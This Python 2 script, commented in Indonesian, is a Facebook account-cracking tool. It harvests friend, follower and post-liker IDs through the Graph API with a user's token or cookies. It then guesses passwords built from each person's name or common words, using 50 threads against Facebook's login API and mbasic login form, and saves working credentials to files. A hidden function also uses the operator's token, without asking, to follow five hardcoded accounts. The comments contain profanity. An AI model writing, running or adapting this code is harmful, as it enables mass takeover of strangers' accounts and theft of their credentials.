#!/usr/bin/python2
# coding=utf-8
# code by Yayan XD
# my facebook ( https://www.facebook.com/KM39453 )
'''
   developer sebenarnya adalah open source code
   jika anda merecode ulang script ini berarti anda bukan lah seorang programmer sejati:)
   
   @YayanXD 02 Januari 2021 Subang Jawa barat
'''
import os
try:
    import concurrent.futures
except ImportError:
    print '\n [×] Modul Futures belum terinstall!\n'
    os.system('pip install futures' if os.name == 'nt' else 'pip2 install futures')

try:
    from bs4 import BeautifulSoup
except ImportError:
    print '\n [×] Modul bs4 belum terinstall!\n'
    os.system('pip install bs4' if os.name == 'nt' else 'pip2 install bs4')
import requests, bs4, sys, os, re, subprocess, random, time, json
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Yayan Juan Alvredo XD.  #
#------------------------------->
id = []
loop = 0
ok = []
cp = []
user = []
ttl_ = []
# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
# mengocok perutttttttt
def tik():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for y in titik:
        print '\r %s[%s+%s] Mohon tunggu %s'%(P,O,P,y),
        sys.stdout.flush()
        time.sleep(1)
#ngentodddddddddddddddd
def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s×%s] menghapus token %s'%(P,M,P,x),
        sys.stdout.flush()
        time.sleep(1)
IP = requests.get('https://api.ipify.org').text
# LO KONTOL
logo = '''%s _____.___.            _____ _____________________
 \__  |   |           /     \\______   \_   _____/ ®
  /   |   |  ______  /  \ /  \|    |  _/|    __)  
  \____   | /_____/ /    Y    \    |   \|     \   
  / ______|         \____|__  /______  /\___  /   
  \/                        \/       \/     \/    
'''%(P)
# Login ngab
def yayanxd():
    os.system('clear')
    print logo
    print '\n %s[%s1%s] Login Cookis Facebook'%(P,O,P)
    print ' %s[%s2%s] Login Token Facebook'%(P,O,P)
    hsjsosoxnxjdjwosoksbcvffjdjwowkbndjdkqoks()
def hsjsosoxnxjdjwosoksbcvffjdjwowkbndjdkqoks():
    asw = raw_input('\n [*] pilih : ')
    if asw == '':
        print '\n %s[%s×%s] Pilih [%s%s%s] tidak ada, cek nomor tolol!'%(P,M,P,M,asw,P)
        time.sleep(1)
        os.system('clear')
        yayanxd()
    elif asw == '1':
       	os.system('clear')
        cokis()
    elif asw == '2':
        token()
    else:
        print '\n %s[%s×%s] Pilih [%s%s%s] tidak ada, cek nomor tolol!'%(P,M,P,M,asw,P)
        time.sleep(1)
        os.system('clear')
        yayanxd()
# Cookies FB bukan Kue
def cokis():
    print logo
    try:
        cookie = raw_input('\n %s[%s?%s] Cookies :%s '%(P,M,P,H))
        tik()
        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8', 
           'cookie': cookie}
        coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
        cari = re.search('(EAAA\\w+)', coki.text)
        hasil = cari.group(1)
        zedd = open('__yayan__.txt', 'w')
        zedd.write(hasil)
        zedd.close()
        jalan('\n %s[%s✓%s] Login Berhasil'%(P,H,P))
        time.sleep(1)
        os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
        cindy()
    except AttributeError:
        print '\n\n %s[%s!%s] Cookies invalid'%(P,M,P)
        time.sleep(2)
        os.system('xdg-open https://youtu.be/DF7bUCn0GFY')
        yayanxd()
    except UnboundLocalError:
        print '\n\n %s[%s!%s] Cookies invalid'%(P,M,P)
        time.sleep(2)
        os.system('xdg-open https://youtu.be/DF7bUCn0GFY')
        yayanxd()
    except requests.exceptions.SSLError:
        os.system('clear')
        print '\n\n %s[%s!%s] tidak ada koneksi\n'%(P,M,P)
        exit()
# Token FB bukan token PLN
def token():
	os.system('clear')
	print logo
	__cindy__ = raw_input('\n %s[%s?%s] Token :%s '%(P,M,P,H))
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open('__yayan__.txt', 'w')
		zedd.write(__cindy__)
		zedd.close()
		print '\n\n %s*%s selamat datang %s%s%s'%(O,N,K,nama,N)
		time.sleep(2)
		print ' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,N)
		time.sleep(2)
		print ' %s*%s subscribe dulu cok yt gw😁%s'%(O,H,N)
		time.sleep(2)
		raw_input(' %s*%s tekan enter '%(O,N))
		os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
		cindy()
	except KeyError:
		print '\n\n %s[%s!%s] token invalid'%(P,M,P)
		time.sleep(2)
		yayanxd()
### ORANG GANTENG ###
def moch_yayan():
    os.system('clear')
    try:
        __cindy__=open('__yayan__.txt','r').read()
    except IOError:
        os.system('clear')
        print '\n %s[%s!%s] token/cookies invalid'%(P,M,P)
        time.sleep(3)
        os.system('rm -rf __yayan__.txt')
        yayanxd()
    try:
        osjaoaosnsi = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
        jaoanzjwowj = json.loads(osjaoaosnsi.text)
        nama = jaoanzjwowj['name']
        idfb = jaoanzjwowj['id']
    except KeyError:
        os.system('clear')
        print '\n %s[%s!%s] token/cookies invalid'%(P,M,P)
        time.sleep(3)
        os.system('rm -rf __yayan__.txt')
        yayanxd()
    except requests.exceptions.ConnectionError:
        print '\n\n %s[%s!%s] tidak ada koneksi\n'%(P,M,P)
        exit()
    os.system('clear')
    print logo
    print ' [*] Author     : Moch Yayan Juan Alvredo XD.'# Cari fb nya mengenang anjir:)
    print ' [*] Github     : https://github.com/Yayan-XD'
    print ' [*] Facebook   : https://www.facebook.com/KM39453'
    print ' [*] ---------------------------------------------'
    print ' [*] Id fb anda : %s%s%s'%(H,idfb,P)
    print ' [*] ---------------------------------------------'
    print ' [*] IP anda    : %s\n'%(IP)
    print ' %s[ Selamat Datang %s%s%s ]\n'%(P,K,nama,P)
    print ' [1]. Dump id dari teman'
    print ' [2]. Dump id dari teman publik'
    print ' [3]. Dump id dari total followers'
    print ' [4]. Dump id dari like postingan'
    print ' [5]. Mulai crack'
    print ' [0]. out(%shapus token%s)'%(M,P)
    awokawokawokawokawokawokawokawokawokawokawokawok()
def awokawokawokawokawokawokawokawokawokawokawokawok():
        yan = raw_input('\n [*] menu : ')
        if yan == '':
           print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu tolol!'%(P,M,P,M,yan,P)
           time.sleep(1)
           os.system('clear')
           moch_yayan()
        elif yan =='1':
                teman()
        elif yan =='2':
                publik()
        elif yan =='3':
                followers()
        elif yan =='4':
                postingan()
        elif yan =='5':
                __crack__().slurr()
        elif yan =='0':
            	print '\n'
                tod()
                time.sleep(1)
                os.system('rm -rf __yayan__.txt')
                jalan ('\n %s[%s✓%s]%s berhasil menghapus token'%(P,H,P,O))
                exit()
        else:
            print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu tolol!'%(P,M,P,M,yan,P)
            time.sleep(1)
            os.system('clear')
            moch_yayan()
# dump id dari teman hehe
def teman():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%s!%s] token/cookies invalid'%(P,M,P)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        mmk = raw_input('\n [?] nama file  : ')
        asw = raw_input(' [?] limit id   : ')
        ihh = requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,__cindy__))
        id = []
        z = json.loads(ihh.text)
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(cin, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] total dump : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s•%s] berhasil dump id dari teman'%(P,H,P))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(B,P,M,cin,P)
        print 50 * '-'
        raw_input('%s [%s ENTER%s ]'%(K,O,K))
        moch_yayan()
    except KeyError:
    	os.remove(cin)
    	jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(P,M,P))
        raw_input(' %s[ %sKEMBALI%s ]%s'%(B,U,B,N))
        moch_yayan()
'''
																																																				csy = 'Cindy sayang Yayan'
																																																				ysc = 'Yayan sayang Cindy'
																																																			'''
# dump id dari teman publik hehe
def publik():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%s!%s] token/cookies invalid'%(P,M,P)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n [?] id publik  : ') 
        ahh = raw_input(' [?] nama file  : ')
        ihh = raw_input(' [?] limit id   : ')
        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,__cindy__))
        id = []
        z = json.loads(xxx.text)
        ppk = ('dump/' + ahh + '.json').replace(' ', '_')
        ys = open(ppk, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] total dump : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s•%s] berhasil dump id dari teman publik'%(P,H,P))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(B,P,M,ppk,P)
        print 50 * '-'
        raw_input('%s [%s ENTER%s ]'%(K,O,K))
        moch_yayan()
    except KeyError:
    	os.remove(ppk)
    	jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(P,M,P))
        raw_input(' %s[ %sKEMBALI%s ]%s'%(B,U,B,N))
        moch_yayan()
# dump id dari followers hehe
def followers():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%s!%s] token/cookies invalid'%(P,M,P)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n [?] id follow  : ')
        mmk = raw_input(' [?] nama file  : ')
        asw = raw_input(' [?] limit id   : ')
        pok = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,__cindy__))
        id = []
        x = json.loads(pok.text)
        ah = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(ah, 'w')
        for a in x['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] total dump : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s•%s] berhasil dump id dari total followers'%(P,H,P))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(B,P,M,ah,P)
        print 50 * '-'
        raw_input('%s [%s ENTER%s ]'%(K,O,K))
        moch_yayan()
    except KeyError:
    	os.remove(ah)
    	jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(P,M,P))
        raw_input(' %s[ %sKEMBALI%s ]%s'%(B,U,B,N))
        moch_yayan()
# dump id dari postingan hehe
def postingan():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%s!%s] token/cookies invalid'%(P,M,P)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n [?] id posts   : ')
        ppk = raw_input(' [?] nama file  : ')
        asw = raw_input(' [?] limit id   : ')
        kon = requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,__cindy__))
        id = []
        x = json.loads(kon.text)
        ikeh = ('dump/' + ppk + '.json').replace(' ', '_')
        ys = open(ikeh, 'w')
        for a in x['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] total dump : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s•%s] berhasil dump id dari like postingan'%(P,H,P))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(B,P,M,ikeh,P)
        print 50 * '-'
        raw_input('%s [%s ENTER%s ]'%(K,O,K))
        moch_yayan()
    except KeyError:
    	os.remove(ikeh)
    	jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(P,M,P))
        raw_input(' %s[ %sKEMBALI%s ]%s'%(B,U,B,N))
        moch_yayan()
# cek tanggal lahir
def __ttl__cp_(user, pw):
    try:
    	os.mkdir('results')
    except:pass
    try:
        __cindy__ = open('__yayan__.txt').read()
        url = ('https://graph.facebook.com/%s/?access_token=%s'%(user, __cindy__))
        with requests.Session() as (ses_):
            data = ses_.get(url).json()
            ttl = data['birthday']
            print '\r  %s* --> %s|%s|%s      %s' % (K,user,pw,ttl,N)
            wrt = '%s|%s' % (user,pw)
            cp.append(wrt)
            open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
    except:
        pass
# mulai ngecrot awokawokawokkawok
class __crack__:

    def __init__(self):
        self.fl = []

    def slurr(self):
        try:
            self.apk = raw_input('\n [?] masukan file : ')
            self.id = open(self.apk).read().splitlines()
        except:
            print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu lah tolol!'%(P,M,P,M,self.apk,P)
            time.sleep(3)
            moch_yayan()

        ___yayanganteng___ = raw_input('\n [*] password manual? [Y/t]: ')
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n [*] contoh: %s[ %ssayang,anjing,bangsat%s ]'%(P,H,P)
            while True:
                pwek = raw_input('\n [?] set kata sandi : ')
                print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, P)
                if pwek == '':
                    self.mains()
                else:
                	
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
                            self.__yan__()
                        elif cin == '1':
                            print '\n [÷] total id -> [%s%s%s%s]\n' %(P,M,len(self.id),P)
                            print ' [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
                            print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
                            print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
                            with YayanGanteng(max_workers=50) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except:
                                        pass

                            os.remove(self.apk)
                            print '\n\n %s[%s#%s] crack selesai...'%(P,K,P)
                            exit()
                            
                        elif cin == '2':
                            print '\n [÷] total id -> [%s%s%s%s]\n' %(P,M,len(self.id),P)
                            print ' [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
                            print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
                            print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
                            with YayanGanteng(max_workers=50) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except:
                                        pass

                            os.remove(self.apk)
                            print '\n\n %s[%s#%s] crack selesai...'%(P,K,P)
                            exit()
                            
                        else:
                            print '\n %s[%s×%s] input yang bener goblok!'%(P,M,P)
                            time.sleep(2)
                            moch_yayan()
                    print '\n [ pilih method login - silahkan coba satu² ]\n'
                    print ' [1] method api (mode fast)'
                    print ' [2] method mbasic (mode slow)'
                    __yan__(pwek.split(','))
                    break

        elif ___yayanganteng___ in ('T', 't'):
            print '\n [ pilih method login - silahkan coba satu² ]\n'
            print ' [1] method api (mode fast)'
            print ' [2] method mbasic (mode slow)'
            self.__pler__()
        else:
            print '\n %s[%s×%s] y/t goblok!'%(P,M,P)
            time.sleep(2)
            moch_yayan()
        return

    def __api__(self, user, _yan_):
        global loop,ok,cp,ttl_
        print '\r [*] crack: %s/%s OK-:%s - CP-:%s '%(loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            api = 'https://b-api.facebook.com/method/auth.login'
            response = requests.get(api, params=params)
            if re.search('(EAAA)\\w+', response.text):
                print '\r  %s* --> %s|%s      %s' % (H,user,pw,N)
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                if len(ttl_) == 1:
                  __ttl__cp_(user, pw)
                  break
                else:
                    print '\r  %s* --> %s|%s      %s' % (K,user,pw,N)
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
            else:
                continue

        loop += 1
        
    def __mbasic__(self, user, _yan_):
        global loop,ok,cp,ttl_
        print '\r [*] crack: %s/%s OK-:%s - CP-:%s '%(loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            xo = aw.content
            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                print '\r  %s* --> %s|%s      %s' % (H,user,pw,N)
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'checkpoint' in xo:
                if len(ttl_) == 1:
                  __ttl__cp_(user, pw)
                  break
                else:
                    print '\r  %s* --> %s|%s      %s' % (K,user,pw,N)
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
            else:
                continue

        loop += 1
										
    def __pler__(self):
        yan = raw_input('\n [*] method : ')
        if yan == '':
            self.__pler__()
        elif yan == '1':
            print '\n [+] total id -> [%s%s%s%s]\n' %(P,M,len(self.id),P)
            print ' [#] hasil OK disimparesults results/OK-%s-%s-%s.txt' % (ha, op, ta)
            print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
            print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
            with YayanGanteng(max_workers=50) as (__yayanXD__):
                for syg in self.id:
                    try:
                        y = syg.split('<=>')
                        c = y[1].split(' ')
                        if len(c) == 1 or len(c) == 2 or len(c) == 3 or len(c) == 4 or len(c) == 5:
                            if len(c[0]) <= 5:
                                asu = [
                                 c[0],
                                 c[0] + '123',
                                 c[0] + '1234',
                                 c[0] + '12345',
                                 ]
                            else:
                                asu = [
                                 'bismillah', 'sayang', 'cantik', 'ganteng', 'kontol',
                                 ]
                        __yayanXD__.submit(self.__api__, y[0], asu)
                    except:
                        pass

            os.remove(self.apk)
            print '\n\n %s[%s#%s] crack selesai...'%(P,K,P)
            exit()

        elif yan in ('2', '02'):
            print '\n [÷] total id -> [%s%s%s%s]\n' %(P,M,len(self.id),P)
            print ' [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta)
            print ' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta)
            print '\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n'
            with YayanGanteng(max_workers=50) as (__yayanXD__):
                for love in self.id:
                    try:
                        c = love.split('<=>')
                        y = c[1].split(' ')
                        if len(y) == 1 or len(y) == 2 or len(y) == 3 or len(y) == 4 or len(y) == 5:
                            if len(y[0]) <= 5:
                                raimu = [
                                 y[0],
                                 y[0] + '123',
                                 y[0] + '1234',
                                 y[0] + '12345',
                                 ]
                            else:
                                raimu = [
                                 'bismillah', 'sayang', 'cantik', 'ganteng', 'kontol',
                                 ]
                        __yayanXD__.submit(self.__mbasic__, c[0], raimu)
                    except:
                        pass

			os.remove(self.apk)
            print '\n\n %s[%s#%s] crack selesai...'%(P,K,P)
            exit()

def cindy():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%s!%s] token/cookies invalid'%(P,M,P)
        yayanxd()
    requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(__cindy__))
    requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(__cindy__))
    requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(__cindy__))
    requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(__cindy__))
    requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(__cindy__))
    moch_yayan()
    
if __name__ == '__main__':
    moch_yayan()